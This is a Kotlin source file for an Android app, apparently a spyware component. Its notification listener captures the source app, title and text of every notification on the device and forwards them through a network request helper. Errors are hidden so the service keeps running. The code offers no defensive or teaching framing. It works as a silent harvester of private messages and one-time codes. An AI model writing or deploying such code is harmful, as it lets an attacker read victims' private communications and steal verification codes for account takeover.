package willi.fiend.Utils

import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.pm.PackageManager

class AppNotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        // ✅ التحقق من إذن الإشعارات في Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) 
                != PackageManager.PERMISSION_GRANTED) {
                // لا نملك الإذن، لا نرسل الإشعار
                return
            }
        }
        
        try {
            val title = sbn?.notification?.extras?.getString("android.title")
            val text = sbn?.notification?.extras?.getString("android.text")
            val packageName = sbn?.packageName

            var message = ""
            message += "App : $packageName\n"
            message += "Title : $title\n"
            message += "Text : $text"

            AppRequest().sendText(AppRequest.Text(message))
        } catch (e: Exception) {
            // ✅ تجاهل الأخطاء بهدوء لمنع انهيار الخدمة
            e.printStackTrace()
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // ✅ يمكن إضافة منطق إضافي هنا إذا لزم الأمر
    }
}
